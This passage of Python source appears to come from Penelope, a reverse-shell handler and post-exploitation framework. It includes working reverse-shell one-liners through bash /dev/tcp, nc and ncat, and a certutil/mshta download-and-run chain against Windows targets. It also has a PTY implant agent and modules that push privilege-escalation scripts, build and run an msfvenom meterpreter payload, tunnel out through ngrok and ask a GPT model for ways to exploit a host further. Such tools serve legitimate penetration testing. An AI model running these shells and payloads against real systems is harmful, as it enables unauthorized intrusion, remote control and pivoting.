			tempfile_bat = f'/dev/shm/{rand(16)}.bat'
			with zipfile.ZipFile(tempfile_zip, 'w') as myzip:
				altnames = []
				for item in resolved_items:
					if isinstance(item, tuple):
						filename, data = item
						if randomize_fname:
							filename = Path(filename)
							altname = f"{filename.stem}-{rand(8)}{filename.suffix}"
						else:
							altname = filename
						zip_info = zipfile.ZipInfo(filename=str(altname))
						zip_info.date_time = time.localtime(time.time())[:6]
						myzip.writestr(zip_info, data)
					else:
						altname = f"{item.stem}-{rand(8)}{item.suffix}" if randomize_fname else item.name
						myzip.write(item, arcname=altname)
					altnames.append(altname)

			server = FileServer(host=self._host, url_prefix=rand(8), quiet=True)
			urlpath_zip = server.add(tempfile_zip)

			cwd_escaped = self.cwd.replace('\\', '\\\\')
			tmp_escaped = self.tmp.replace('\\', '\\\\')
			temp_remote_file_zip = urlpath_zip.split("/")[-1]

			fetch_cmd = f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_zip}" "%TEMP%\\{temp_remote_file_zip}" && echo DOWNLOAD OK'
			unzip_cmd = f'mshta "javascript:var sh=new ActiveXObject(\'shell.application\'); var fso = new ActiveXObject(\'Scripting.FileSystemObject\'); sh.Namespace(\'{cwd_escaped}\').CopyHere(sh.Namespace(\'{tmp_escaped}\\\\{temp_remote_file_zip}\').Items(), 16); while(sh.Busy) {{WScript.Sleep(100);}} fso.DeleteFile(\'{tmp_escaped}\\\\{temp_remote_file_zip}\');close()" && echo UNZIP OK'

			with open(tempfile_bat, "w") as f:
				f.write(fetch_cmd + "\n")
				f.write(unzip_cmd)

			urlpath_bat = server.add(tempfile_bat)
			temp_remote_file_bat = urlpath_bat.split("/")[-1]
			server.start()
			response = self.exec(
				f'certutil -urlcache -split -f "http://{self._host}:{server.port}{urlpath_bat}" "%TEMP%\\{temp_remote_file_bat}"&"%TEMP%\\{temp_remote_file_bat}"&del "%TEMP%\\{temp_remote_file_bat}"',
				force_cmd=True, value=True, timeout=None)
			server.stop()
			if not response:
				logger.error("Upload initialization failed...")
				return []
			if not "DOWNLOAD OK" in response:
				logger.error("Data transfer failed...")
				return []
			if not "UNZIP OK" in response:
				logger.error("Data unpacking failed...")
				return []

		# Present uploads
		uploaded_paths = []
		for item in altnames:
			if self.OS == "Unix":
				uploaded_path = shlex.quote(str(Path(destination) / item))
			elif self.OS == "Windows":
				uploaded_path = f'"{PureWindowsPath(destination, item)}"'
			logger.info(f"{paint('Upload OK').GREEN_white} {paint(uploaded_path).yellow}")
			uploaded_paths.append(uploaded_path)
			print()

		return uploaded_paths

	@agent_only
	def script(self, local_script):

		local_script_folder = self.directory / "scripts"
		prefix = datetime.now().strftime("%Y_%m_%d-%H_%M_%S-")

		try:
			local_script_folder.mkdir(parents=True, exist_ok=True)
		except Exception as e:
			logger.error(e)
			return False

		if re.match(r'(http|ftp)s?://', local_script, re.IGNORECASE):
			try:
				filename, data = url_to_bytes(local_script)
				if not data:
					return False
			except Exception as e:
				logger.error(e)

			local_script = local_script_folder / (prefix + filename)
			with open(local_script, "wb") as input_file:
				input_file.write(data)
		else:
			local_script = Path(normalize_path(local_script))

		output_file_name = local_script_folder / (prefix + "output.txt")

		try:
			input_file = open(local_script, "rb")
			output_file = open(output_file_name, "wb")
			first_line = input_file.readline().strip()
			#input_file.seek(0) # Maybe it is not needed
			if first_line.startswith(b'#!'):
				program = first_line[2:].decode()
			else:
				logger.error("No shebang found")
				return False

			tail_cmd = f'tail -n+0 -f {output_file_name}'
			print(tail_cmd)
			Open(tail_cmd, terminal=True)

			thread = threading.Thread(target=self.exec, args=(program, ), kwargs={
				'stdin_src': input_file,
				'stdout_dst': output_file,
				'stderr_dst': output_file
			})
			thread.start()

		except Exception as e:
			logger.error(e)
			return False

		return output_file_name

	def spawn(self, port=None, host=None):

		if self.OS == "Unix":
			if any([self.listener, port, host]):

				port = port or self._port
				host = host or self._host

				if not next((listener for listener in core.listeners.values() if listener.port == port), None):
					new_listener = TCPListener(host, port)

				if self.bin['bash']:
					cmd = f'printf "(bash >& /dev/tcp/{host}/{port} 0>&1) &"|bash'
				elif self.bin['nc'] and self.bin['sh']:
					cmd = f'printf "(rm /tmp/_;mkfifo /tmp/_;cat /tmp/_|sh 2>&1|nc {host} {port} >/tmp/_) &"|sh'
				elif self.bin['sh']:
					ncat_cmd = f'{self.bin["sh"]} -c "{self.bin["setsid"]} {{}} -e {self.bin["sh"]} {host} {port} &"'
					ncat_binary = self.tmp + '/ncat'
					if not self.exec(f"test -f {ncat_binary} || echo x"):
						cmd = ncat_cmd.format(ncat_binary)
					else:
						logger.warning("ncat is not available on the target")
						ncat_binary = self.need_binary(
							"ncat",
							URLS['ncat']
							)
						if ncat_binary:
							cmd = ncat_cmd.format(ncat_binary)
						else:
							logger.error("Spawning shell aborted")
							return False
				else:
					logger.error("No available shell binary is present...")
					return False

				logger.info(f"Attempting to spawn a reverse shell on {host}:{port}")
				self.exec(cmd)

				# TODO maybe destroy the new_listener upon getting a shell?
				# if new_listener:
				#	new_listener.stop()
			else:
				host, port = self.socket.getpeername()
				logger.info(f"Attempting to spawn a bind shell from {host}:{port}")
				if not Connect(host, port):
					logger.info("Spawn bind shell failed. I will try getting a reverse shell...")
					return self.spawn(port, self._host)

		elif self.OS == 'Windows':
			logger.warning("Spawn Windows shells is not implemented yet")
			return False

		return True

	@agent_only
	def portfwd(self, _type, lhost, lport, rhost, rport):

		session = self
		control = ControlQueue()
		stop = threading.Event()
		task = [(_type, lhost, lport, rhost, rport), control, stop]

		class ThreadedTCPRequestHandler(socketserver.BaseRequestHandler):
			def handle(self):

				self.request.setblocking(False)
				stdin_stream = session.new_streamID
				stdout_stream = session.new_streamID
				stderr_stream = session.new_streamID

				if not all([stdin_stream, stdout_stream, stderr_stream]):
					return

				code = rf"""
				import socket
				client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
				frlist = [stdin_stream]
				connected = False
				while True:
					readables, _, _ = select(frlist, [], [])

					for readable in readables:
						if readable is stdin_stream:
							data = stdin_stream.read({options.network_buffer_size})
							if not connected:
								client.connect(("{rhost}", {rport}))
								client.setblocking(False)
								frlist.append(client)
								connected = True
							try:
								client.sendall(data)
							except OSError:
								break
							if not data:
								frlist.remove(stdin_stream)
								break
						if readable is client:
							try:
								data = client.recv({options.network_buffer_size})
								stdout_stream.write(data)
								if not data:
									frlist.remove(client) # TEMP
									break
							except OSError:
								frlist.remove(client) # TEMP
								break
					else:
						continue
					break
				#client.shutdown(socket.SHUT_RDWR)
				client.close()
				"""
				session.exec(
					code,
					python=True,
					stdin_stream=stdin_stream,
					stdout_stream=stdout_stream,
					stderr_stream=stderr_stream,
					stdin_src=self.request,
					stdout_dst=self.request,
					agent_control=control
				)
				os.close(stderr_stream._read) #TEMP

		class ThreadedTCPServer(socketserver.ThreadingMixIn, socketserver.TCPServer):
			allow_reuse_address = True
			request_queue_size = 100

			@handle_bind_errors
			def server_bind(self, lhost, lport):
				self.server_address = (lhost, int(lport))
				super().server_bind()

		def server_thread():
			with ThreadedTCPServer(None, ThreadedTCPRequestHandler, bind_and_activate=False) as server:
				if not server.server_bind(lhost, lport):
					return False
				server.server_activate()
				task.append(server)
				logger.info(f"Setup Port Forwarding: {lhost}:{lport} {'->' if _type=='L' else '<-'} {rhost}:{rport}")
				session.tasks['portfwd'].append(task)
				server.serve_forever()
			stop.set()

		portfwd_thread = threading.Thread(target=server_thread)
		task.append(portfwd_thread)
		portfwd_thread.start()

	def maintain(self):
		with core.lock:
			current_num = len(core.hosts[self.name]) if core.hosts else 0
			if 0 < current_num < options.maintain:
				session = core.hosts[self.name][-1]
				logger.warning(paint(
						f" --- Session {session.id} is trying to maintain {options.maintain} "
						f"active shells on {self.name} ---"
					).blue)
				return session.spawn()
		return False

	def kill(self):
		if self not in core.rlist:
			return True

		if menu.sid == self.id:
			menu.set_id(None)

		thread_name = threading.current_thread().name
		logger.debug(f"Thread <{thread_name}> wants to kill session {self.id}")

		if thread_name != 'Core':
			if self.OS:
				if self.host_needs_control_session and\
					not self.spare_control_sessions and\
					self.control_session is self:

					sessions = ', '.join([str(session.id) for session in self.host_needs_control_session])
					logger.warning(f"Cannot kill Session {self.id} as the following sessions depend on it: [{sessions}]")
					return False

				for module in modules().values():
					if module.enabled and module.on_session_end:
						module.run(self)
			else:
				self.id = randint(10**10, 10**11-1)
				core.sessions[self.id] = self

			core.control << f'self.sessions[{self.id}].kill()'
			return

		self.subchannel.control.close()
		self.subchannel.close()

		core.rlist.remove(self)
		if self in core.wlist:
			core.wlist.remove(self)
		try:
			self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, struct.pack("ii", 1, 0)) # RST
			#self.socket.shutdown(socket.SHUT_RDWR) # FIN
		except OSError:
			pass
		self.socket.close()

		if not self.OS:
			message = f"Invalid shell from {self.ip} 🙄"
		else:
			message = f"Session [{self.id}] died..."
			core.hosts[self.name].remove(self)
			if not core.hosts[self.name]:
				message += f" We lost {self.name_colored} 💔"
				del core.hosts[self.name]

		if self.id in core.sessions:
			del core.sessions[self.id]
		logger.error(message)

		if hasattr(self, 'logfile'):
			self.logfile.close()

		if self.is_attached:
			self.detach()

		for portfwd in self.tasks['portfwd']:
			info, control, stop, thread, server = portfwd
			logger.warning(f"Stopping Port Forwarding: {info[1]}:{info[2]} {'->' if info[0]=='L' else '<-'} {info[3]}:{info[4]}")
			server.shutdown()
			server.server_close()
			while not stop.is_set(): # TEMP
				control << "stop"
			thread.join()

		if self.OS:
			threading.Thread(target=self.maintain).start()
		return True


class Messenger:
	SHELL = 1
	RESIZE = 2
	EXEC = 3
	STREAM = 4

	STREAM_CODE = '!H'
	STREAM_BYTES = struct.calcsize(STREAM_CODE)

	LEN_CODE = 'H'
	_LEN_CODE = '!' + 'H'
	LEN_BYTES = struct.calcsize(LEN_CODE)

	TYPE_CODE = 'B'
	_TYPE_CODE = '!' + 'B'
	TYPE_BYTES = struct.calcsize(TYPE_CODE)

	HEADER_CODE = '!' + LEN_CODE + TYPE_CODE

	def __init__(self, bufferclass):
		self.len = None
		self.input_buffer = bufferclass()
		self.length_buffer = bufferclass()
		self.message_buffer = bufferclass()

	def message(_type, _data):
		return struct.pack(Messenger.HEADER_CODE, len(_data) + Messenger.TYPE_BYTES, _type) + _data
	message = staticmethod(message)

	def feed(self, data):
		self.input_buffer.write(data)
		self.input_buffer.seek(0)

		while True:
			if not self.len:
				len_need = Messenger.LEN_BYTES - self.length_buffer.tell()
				data = self.input_buffer.read(len_need)
				self.length_buffer.write(data)
				if len(data) != len_need:
					break

				self.len = struct.unpack(Messenger._LEN_CODE, self.length_buffer.getvalue())[0]
				self.length_buffer.seek(0)
				self.length_buffer.truncate()
			else:
				data_need = self.len - self.message_buffer.tell()
				data = self.input_buffer.read(data_need)
				self.message_buffer.write(data)
				if len(data) != data_need:
					break

				self.message_buffer.seek(0)
				_type = struct.unpack(Messenger._TYPE_CODE, self.message_buffer.read(Messenger.TYPE_BYTES))[0]
				_message = self.message_buffer.read()

				self.len = None
				self.message_buffer.seek(0)
				self.message_buffer.truncate()
				yield _type, _message

		self.input_buffer.seek(0)
		self.input_buffer.truncate()

class Stream:
	def __init__(self, _id, _session=None):
		self.id = _id
		self._read, self._write = os.pipe()
		self.writebuf = None
		self.feed_thread = None
		self.session = _session

		if self.session is None:
			self.writefunc = lambda data: respond(self.id + data)
			cloexec(self._write)
			cloexec(self._read)
		else:
			self.writefunc = lambda data: self.session.send(Messenger.message(Messenger.STREAM, self.id + data))

	def __lshift__(self, data):
		if not self.writebuf:
			self.writebuf = queue.Queue()
		self.writebuf.put(data)
		if not self.feed_thread:
			self.feed_thread = threading.Thread(target=self.feed, name="feed stream -> " + repr(self.id))
			self.feed_thread.start()

	def feed(self):
		while True:
			data = self.writebuf.get()
			if not data:
				try:
					os.close(self._write)
				except:
					pass
				break
			try:
				os.write(self._write, data)
			except:
				break

	def fileno(self):
		return self._read

	def write(self, data):
		self.writefunc(data)

	def read(self, n):
		try:
			data = os.read(self._read, n)
		except:
			return "".encode()
		if not data:
			try:
				os.close(self._read)
			except:
				pass
		return data

def agent():
	import os
	import sys
	import pty
	import shlex
	import fcntl
	import struct
	import signal
	import termios
	import threading
	from select import select
	signal.signal(signal.SIGINT, signal.SIG_DFL)
	signal.signal(signal.SIGQUIT, signal.SIG_DFL)

	if sys.version_info[0] == 2:
		import Queue as queue
	else:
		import queue
	try:
		import io
		bufferclass = io.BytesIO
	except:
		import StringIO
		bufferclass = StringIO.StringIO

	SHELL = "{}"
	NET_BUF_SIZE = {}
	{}
	{}

	def respond(_value, _type=Messenger.STREAM):
		wlock.acquire()
		outbuf.seek(0, 2)
		outbuf.write(Messenger.message(_type, _value))
		if not pty.STDOUT_FILENO in wlist:
			wlist.append(pty.STDOUT_FILENO)
			os.write(control_in, "1".encode())
		wlock.release()

	def cloexec(fd):
		try:
			flags = fcntl.fcntl(fd, fcntl.F_GETFD)
			fcntl.fcntl(fd, fcntl.F_SETFD, flags | fcntl.FD_CLOEXEC)
		except:
			pass

	shell_pid, master_fd = pty.fork()
	if shell_pid == pty.CHILD:
		os.execl(SHELL, SHELL, '-i')
	try:
		pty.setraw(pty.STDIN_FILENO)
	except:
		pass

	try:
		streams = dict()
		messenger = Messenger(bufferclass)
		outbuf = bufferclass()
		ttybuf = bufferclass()

		wlock = threading.Lock()
		control_out, control_in = os.pipe()
		cloexec(control_out)
		cloexec(control_in)

		rlist = [control_out, master_fd, pty.STDIN_FILENO]
		wlist = []
		for fd in (master_fd, pty.STDIN_FILENO, pty.STDOUT_FILENO, pty.STDERR_FILENO): # TODO
			flags = fcntl.fcntl(fd, fcntl.F_GETFL)
			fcntl.fcntl(fd, fcntl.F_SETFL, flags | os.O_NONBLOCK)
			cloexec(fd)

		while True:
			rfds, wfds, _ = select(rlist, wlist, [])

			for readable in rfds:
				if readable is control_out:
					os.read(control_out, 1)

				elif readable is master_fd:
					try:
						data = os.read(master_fd, NET_BUF_SIZE)
					except:
						data = ''.encode()
					respond(data, Messenger.SHELL)
					if not data:
						rlist.remove(master_fd)
						try:
							os.close(master_fd)
						except:
							pass

				elif readable is pty.STDIN_FILENO:
					try:
						data = os.read(pty.STDIN_FILENO, NET_BUF_SIZE)
					except:
						data = None
					if not data:
						rlist.remove(pty.STDIN_FILENO)
						break

					messages = messenger.feed(data)
					for _type, _value in messages:
						if _type == Messenger.SHELL:
							ttybuf.seek(0, 2)
							ttybuf.write(_value)
							if not master_fd in wlist:
								wlist.append(master_fd)

						elif _type == Messenger.RESIZE:
							fcntl.ioctl(master_fd, termios.TIOCSWINSZ, _value)

						elif _type == Messenger.EXEC:
							sb = str(Messenger.STREAM_BYTES)
							header_size = 1 + int(sb) * 3
							__type, stdin_stream_id, stdout_stream_id, stderr_stream_id = struct.unpack(
								'!c' + (sb + 's') * 3,
								_value[:header_size]
							)
							cmd = _value[header_size:]

							if not stdin_stream_id in streams:
								streams[stdin_stream_id] = Stream(stdin_stream_id)
							if not stdout_stream_id in streams:
								streams[stdout_stream_id] = Stream(stdout_stream_id)
							if not stderr_stream_id in streams:
								streams[stderr_stream_id] = Stream(stderr_stream_id)

							stdin_stream = streams[stdin_stream_id]
							stdout_stream = streams[stdout_stream_id]
							stderr_stream = streams[stderr_stream_id]

							rlist.append(stdout_stream)
							rlist.append(stderr_stream)

							if __type == 'S'.encode():
								pid = os.fork()
								if pid == 0:
									os.dup2(stdin_stream._read, 0)
									os.dup2(stdout_stream._write, 1)
									os.dup2(stderr_stream._write, 2)
									os.execl("{}", "sh", "-c", cmd)
									os._exit(1)
								os.close(stdin_stream._read)
								os.close(stdout_stream._write)
								os.close(stderr_stream._write)

							elif __type == 'P'.encode():
								def run(stdin_stream, stdout_stream, stderr_stream):
									try:
										{}
									except:
										stderr_stream << (str(sys.exc_info()[1]) + "\n").encode()
									try:
										os.close(stdin_stream._read)
									except:
										pass

									#if stdin_stream_id in streams:
									#	del streams[stdin_stream_id]
									stdout_stream << "".encode()
									stderr_stream << "".encode()
								threading.Thread(target=run, args=(stdin_stream, stdout_stream, stderr_stream)).start()

						# Incoming streams
						elif _type == Messenger.STREAM:
							stream_id, data = _value[:Messenger.STREAM_BYTES], _value[Messenger.STREAM_BYTES:]
							if not stream_id in streams:
								streams[stream_id] = Stream(stream_id)
							streams[stream_id] << data

				# Outgoing streams
				else:
					data = readable.read(NET_BUF_SIZE)
					readable.write(data)
					if not data:
						rlist.remove(readable)
						del streams[readable.id]

			else:
				for writable in wfds:

					if writable is pty.STDOUT_FILENO:
						sendbuf = outbuf
						wlock.acquire()

					elif writable is master_fd:
						sendbuf = ttybuf

					try:
						sent = os.write(writable, sendbuf.getvalue())
					except OSError:
						wlist.remove(writable)
						if sendbuf is outbuf:
							wlock.release()
						continue

					sendbuf.seek(sent)
					remaining = sendbuf.read()
					sendbuf.seek(0)
					sendbuf.truncate()
					sendbuf.write(remaining)
					if not remaining:
						wlist.remove(writable)
					if sendbuf is outbuf:
						wlock.release()
				continue
			break
	except:
		_, e, t = sys.exc_info()
		import traceback
		traceback.print_exc()
		traceback.print_stack()
	try:
		os.close(master_fd)
	except:
		pass
	os.waitpid(shell_pid, 0)[1]
	os.kill(os.getppid(), signal.SIGKILL) # TODO


def modules():
	return {module.__name__:module for module in Module.__subclasses__()}


class Module:
	enabled = True
	on_session_start = False
	on_session_end = False
	category = "Misc"


class upload_privesc_scripts(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Upload a set of privilege escalation scripts to the target
		"""
		if session.OS == 'Unix':
			session.upload(URLS['linpeas'])
			session.upload(URLS['lse'])
			session.upload(URLS['deepce'])

		elif session.OS == 'Windows':
			session.upload(URLS['winpeas'])
			session.upload(URLS['powerup'])
			session.upload(URLS['privesccheck'])


class peass_ng(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of PEASS-ng in the background
		"""
		if session.OS == 'Unix':
			parser = ArgumentParser(prog='peass_ng', description="peass-ng module", add_help=False)
			parser.add_argument("-a", "--ai", help="Analyze linpeas results with chatGPT", action="store_true")
			try:
				arguments = parser.parse_args(shlex.split(args))
			except SystemExit:
				return
			if arguments.ai:
				try:
					from openai import OpenAI
					#api_key = input("Please enter your chatGPT API key: ")
					#assert len(api_key) > 10
				except Exception as e:
					logger.error(e)
					return False

			output_file = session.script(URLS['linpeas'])

			if arguments.ai:
				api_key = input("Please enter your chatGPT API key: ")
				assert len(api_key) > 10

				with open(output_file, "r") as file:
					content = file.read()

				client = OpenAI(api_key=api_key)
				stream = client.chat.completions.create(
				    model="gpt-4o-mini",
				    messages=[
					{"role": "system", "content": "You are a helpful assistant helping me to perform penetration test to protect the systems"},
					{
					    "role": "user",
					    "content": f"I am pasting here the results of linpeas. Based on the output, I want you to tell me all possible ways the further exploit this system. I want you to be very specific on your analysis and not write generalities and uneccesary information. I want to focus only on your specific suggestions.\n\n\n {content}"
					}
				    ],
				stream=True
				)

				print('\n═════════════════ chatGPT analysis START ════════════════')
				for chunk in stream:
					if chunk.choices[0].delta.content:
						#print(chunk.choices[0].delta.content, end="", flush=True)
						stdout(chunk.choices[0].delta.content.encode())
				print('\n═════════════════ chatGPT analysis END ════════════════')

		elif session.OS == 'Windows':
			logger.error("This module runs only on Unix shells")
			while True:
				answer = ask(f"Use {paint('upload_privesc_scripts').GREY_white}{paint(' instead? (Y/n): ').yellow}").lower()
				if answer in ('y', ''):
					menu.do_run('upload_privesc_scripts')
					break
				elif answer == 'n':
					break

class lse(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of linux-smart-enumeration in the background
		"""
		if session.OS == 'Unix':
			session.script(URLS['lse'])
		else:
			logger.error("This module runs only on Unix shells")


class linuxexploitsuggester(Module):
	category = "Privilege Escalation"
	def run(session, args):
		"""
		Run the latest version of linux-exploit-suggester in the background
		"""
		if session.OS == 'Unix':
			session.script(URLS['les'])
		else:
			logger.error("This module runs only on Unix shells")


class meterpreter(Module):
	def run(session, args):
		"""
		Get a meterpreter shell
		"""
		if session.OS == 'Unix':
			logger.error("This module runs only on Windows shells")
		else:
			payload_path = f"/dev/shm/{rand(10)}.exe"
			host = session._host
			port = 5555
			payload_creation_cmd = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={host} LPORT={port} -f exe > {payload_path}"
			result = subprocess.run(payload_creation_cmd, shell=True, text=True, capture_output=True)

			if result.returncode == 0:
				logger.info("Payload created!")
				uploaded_path = session.upload(payload_path)
				if uploaded_path:
					meterpreter_handler_cmd = (
						'msfconsole -x "use exploit/multi/handler; '
						'set payload windows/meterpreter/reverse_tcp; '
						f'set LHOST {host}; set LPORT {port}; run"'
					)
					Open(meterpreter_handler_cmd, terminal=True)
					print(meterpreter_handler_cmd)
					session.exec(uploaded_path[0])
			else:
				logger.error(f"Cannot create meterpreter payload: {result.stderr}")


class ngrok(Module):
	category = "Pivoting"
	def run(session, args):
		"""
		Setup and create a tcp tunnel using ngrok
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			session.upload(URLS['ngrok_linux'], remote_path=session.tmp)
			result = session.exec(f"tar xf {session.tmp}/ngrok-v3-stable-linux-amd64.tgz -C {session.tmp} >/dev/null", value=True)
			if not result:
				logger.info(f"ngrok successuly extracted on {session.tmp}")
			else:
				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
				return False
			token = input("Authtoken: ")
			session.exec(f"./ngrok config add-authtoken {token}")
			logger.info("Provide a TCP port number to be exposed in ngrok cloud:")
			tcp_port = input("tcp_port: ")
			#logger.info("Indicate if a TCP or an HTTP tunnel is required?:")
			#tunnel = input("tunnel: ")
			cmd = f"cd {session.tmp}; ./ngrok tcp {tcp_port} --log=stdout"
			print(cmd)
			#session.exec(cmd)
			tf = f"/tmp/{rand(8)}"
			with open(tf, "w") as f:
				f.write("#!/bin/sh\n")
				f.write(cmd)
			logger.info(f"ngrok session open")
			session.script(tf)
		else:
			logger.error("This module runs only on Unix shells")


class uac(Module):
	category = "Forensics"
	def run(session, args):
		"""
		Acquire forensic data Unix systems using UAC (Unix-like Artifacts Collector) in the background
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			path = session.upload(URLS['uac_linux'], remote_path=session.tmp)[0]
			result = session.exec(f"tar xf {path} -C {session.tmp} >/dev/null", value=True)
			if not result:
				logger.info(f"UAC successfully extracted on {session.tmp}")
			else:
				logger.error(f"Extraction to {session.tmp} failed:\n{indent(result, ' ' * 4 + '- ')}")
				return False
		#	UAC artifacts or profiles can be set by changing the arguments, e.g.:  /uac -u -a './artifacts/live_response/network*' --output-format tar {session.tmp}
			logger.info(f"root user check is disabled. Data collection may be limited. It will WRITE the output on the remote file system.")
			cmd = f"cd {path.removesuffix('.tar.gz')}; ./uac -u -p ir_triage --output-format tar {session.tmp}"
			#session.exec(cmd)
			tf = f"/tmp/{rand(8)}"
			with open(tf, "w") as f:
				f.write("#!/bin/sh\n")
				f.write(cmd)
			logger.info(f"UAC output will be stored at {session.tmp}/uac-%hostname%-%os%-%timestamp%")
			session.script(tf)
		#	Once completed, transfer the output files to your host
		else:
			logger.error("This module runs only on Unix shells")


class linux_procmemdump(Module):
	category = "Forensics"
	def run(session, args):
		"""
		Dump process memory in the background (requires root)
		"""
		if session.OS == 'Unix':
			if not session.system == 'Linux':
				logger.error(f"This modules runs only on Linux, not on {session.system}.")
				return False
			session.upload(URLS['linux_procmemdump'], remote_path=session.tmp)
			print(session.exec(f"ps -eo pid,cmd", value=True))
			logger.info(f"Please provide the PID of the process to be acquired:")
			PID = input("PID: ")
			session.exec(f"{session.tmp}/linux_procmemdump.sh -p {PID} -s -d {session.tmp}")
			logger.info(f"Strings of the process dump will be stored at {session.tmp}/{PID}/")
		else:
			logger.error("This module runs only on Unix shells")


class FileServer:
	def __init__(self, *items, port=None, host=None, url_prefix=None, quiet=False):
		self.port = port or options.default_fileserver_port
		self.host = host or options.default_interface
		self.host = Interfaces().translate(self.host)
		self.items = items
		self.url_prefix = url_prefix + '/' if url_prefix else ''
		self.quiet = quiet
		self.filemap = {}
		for item in self.items:
			self.add(item)

	def add(self, item):
		if item == '/':
			self.filemap[f'/{self.url_prefix}[root]'] = '/'
			return '/[root]'

		item = os.path.abspath(normalize_path(item))

		if not os.path.exists(item):
			if not self.quiet:
				logger.warning(f"'{item}' does not exist and will be ignored.")
			return None

		if item in self.filemap.values():
			for _urlpath, _item in self.filemap.items():
				if _item == item:
					return _urlpath

		urlpath = f"/{self.url_prefix}{os.path.basename(item)}"
		while urlpath in self.filemap:
			root, ext = os.path.splitext(urlpath)
			urlpath = root + '_' + ext
		self.filemap[urlpath] = item
		return urlpath

	def remove(self, item):
		item = os.path.abspath(normalize_path(item))
		if item in self.filemap:
			del self.filemap[f"/{os.path.basename(item)}"]
		else:
			if not self.quiet:
				logger.warning(f"{item} is not served.")

	@property
	def links(self):
		output = []
		ips = [self.host]

		if self.host == '0.0.0.0':
			ips = [ip for ip in Interfaces().list.values()]

		for ip in ips:
			output.extend(('', '🏠 http://' + str(paint(ip).cyan) + ":" + str(paint(self.port).red) + '/' + self.url_prefix))
			table = Table(joinchar=' → ')
			for urlpath, filepath in self.filemap.items():
				table += (
					paint(f"{'📁' if os.path.isdir(filepath) else '📄'} ").green +
					paint(f"http://{ip}:{self.port}{urlpath}").white_BLUE, filepath
				)
			output.append(str(table))
			output.append("─" * len(output[1]))

		return '\n'.join(output)

	def start(self):
		threading.Thread(target=self._start).start()

	def _start(self):
		filemap, host, port, url_prefix, quiet = self.filemap, self.host, self.port, self.url_prefix, self.quiet

		class CustomTCPServer(socketserver.TCPServer):
			allow_reuse_address = True

			def __init__(self, *args, **kwargs):
				self.client_sockets = []
				super().__init__(*args, **kwargs)

			@handle_bind_errors
			def server_bind(self, host, port):
				self.server_address = (host, int(port))
				super().server_bind()

			def process_request(self, request, client_address):
				self.client_sockets.append(request)
				super().process_request(request, client_address)

			def shutdown(self):
				for sock in self.client_sockets:
					try:
						sock.shutdown(socket.SHUT_RDWR)
						sock.close()
					except:
						pass
				super().shutdown()

		class CustomHandler(SimpleHTTPRequestHandler):
			def do_GET(self):
				try:
					if self.path == '/' + url_prefix:
						response = ''
						for path in filemap.keys():
							response += f'<li><a href="{path}">{path}</a></li>'
						response = response.encode()
						self.send_response(200)
						self.send_header("Content-type", "text/html")
						self.send_header("Content-Length", str(len(response)))
						self.end_headers()

						self.wfile.write(response)
					else:
						super().do_GET()
				except Exception as e:
					logger.error(e)

			def translate_path(self, path):
				path = path.split('?', 1)[0]
				path = path.split('#', 1)[0]
				try:
					path = unquote(path, errors='surrogatepass')
				except UnicodeDecodeError:
					path = unquote(path)
				path = os.path.normpath(path)

				for urlpath, filepath in filemap.items():
					if path == urlpath:
						return filepath
					elif path.startswith(urlpath):
						relpath = path[len(urlpath):].lstrip('/')
						return os.path.join(filepath, relpath)
				return ""

			def log_message(self, format, *args):
				if quiet:
					return None
				message = format % args
				response = message.translate(self._control_char_table).split(' ')
				if not response[0].startswith('"'):
					return
				if response[3][0] == '3':
					color = 'yellow'
				elif response[3][0] in ('4', '5'):
					color = 'red'
				else:
					color = 'green'

				response = getattr(paint(f"{response[0]} {response[1]} {response[3]}\""), color)

				logger.info(
					f"{paint('[').white}{paint(self.log_date_time_string()).magenta}] "
					f"FileServer({host}:{port}) [{paint(self.address_string()).cyan}] {response}"
				)

		with CustomTCPServer((self.host, self.port), CustomHandler, bind_and_activate=False) as self.httpd:
			if not self.httpd.server_bind(self.host, self.port):
				return False
			self.httpd.server_activate()
			self.id = core.new_fileserverID
			core.fileservers[self.id] = self
			if not quiet:
				print(self.links)
			self.httpd.serve_forever()

	def stop(self):
		del core.fileservers[self.id]
		if not self.quiet:
			logger.warning(f"Shutting down Fileserver #{self.id}")
		self.httpd.shutdown()


def WinResize(num, stack):
	if core.attached_session is not None and core.attached_session.type == "PTY":
		core.attached_session.update_pty_size()


def custom_excepthook(*args):
	if len(args) == 1 and hasattr(args[0], 'exc_type'):
		exc_type, exc_value, exc_traceback = args[0].exc_type, args[0].exc_value, args[0].exc_traceback
	elif len(args) == 3:
		exc_type, exc_value, exc_traceback = args
	else:
		return
	print("\n", paint('Oops...').RED, '🐞\n', paint().yellow, '─' * 80, sep='')
	sys.__excepthook__(exc_type, exc_value, exc_traceback)
	print('─' * 80, f"\n{paint('Penelope version:').red} {paint(__version__).green}")
	print(f"{paint('Python version:').red} {paint(sys.version).green}")
	print(f"{paint('System:').red} {paint(platform.version()).green}\n")

def get_glob_size(_glob, block_size):
	from glob import glob
	from math import ceil
	normalize_path = lambda path: os.path.normpath(os.path.expandvars(os.path.expanduser(path)))
	def size_on_disk(filepath):
		try:
			return ceil(float(os.lstat(filepath).st_size) / block_size) * block_size
		except:
			return 0
	total_size = 0
	for part in shlex.split(_glob):
		for item in glob(normalize_path(part)):
			if os.path.isfile(item):
				total_size += size_on_disk(item)
			elif os.path.isdir(item):
				for root, dirs, files in os.walk(item):
					for file in files:
						filepath = os.path.join(root, file)
						total_size += size_on_disk(filepath)
	return total_size

def url_to_bytes(URL):

	# URLs with special treatment
	URL = re.sub(
		r"https://www.exploit-db.com/exploits/",
		"https://www.exploit-db.com/download/",
		URL
	)

	req = Request(URL, headers={'User-Agent': options.useragent})

	logger.trace(paint(f"Download URL: {URL}").cyan)
	ctx = ssl.create_default_context() if options.verify_ssl_cert else ssl._create_unverified_context()

	while True:
		try:
			response = urlopen(req, context=ctx, timeout=options.short_timeout)
			break
		except (HTTPError, TimeoutError) as e:
			logger.error(e)
		except URLError as e:
